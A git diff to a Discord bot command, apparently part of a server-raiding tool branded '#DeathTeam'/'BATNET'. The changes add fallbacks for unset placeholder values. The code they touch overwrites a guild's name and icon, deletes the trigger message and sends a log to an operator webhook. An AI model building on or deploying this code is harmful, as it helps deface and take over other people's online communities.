@@ -23,7 +23,7 @@ async execute(client, message, args){
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
                          },
                          footer: {
                               text: '#DeathTeam',
@@ -49,7 +49,7 @@ async execute(client, message, args){
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
                          },
                          footer: {
                               text: '#DeathTeam',
@@ -60,13 +60,17 @@ async execute(client, message, args){
                     ]
           }
           
-          fetch(util.webhook_url, {
-               method: 'POST',
-               headers: {
-                    'Content-type': 'application/json'
-               },
-               body: JSON.stringify(log)
-          });
+          if (util.webhook_url !== "WEBHOOK") {
+               fetch(util.webhook_url, {
+                    method: 'POST',
+                    headers: {
+                         'Content-type': 'application/json'
+                    },
+                    body: JSON.stringify(log)
+               });
+          } else {
+               console.error(chalk.red(`\n[ BATNET ] Could not send log, Webhook not configured, configure it at: utilities\\ignore.json\n`));
+          }
           
           message.delete();
           
@@ -81,7 +85,7 @@ async execute(client, message, args){
           });
       
       message.guild.setName(util.server_name);
-      message.guild.setIcon(util.server_logo);
+      message.guild.setIcon(util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless");
      
 }, 5000);
 }
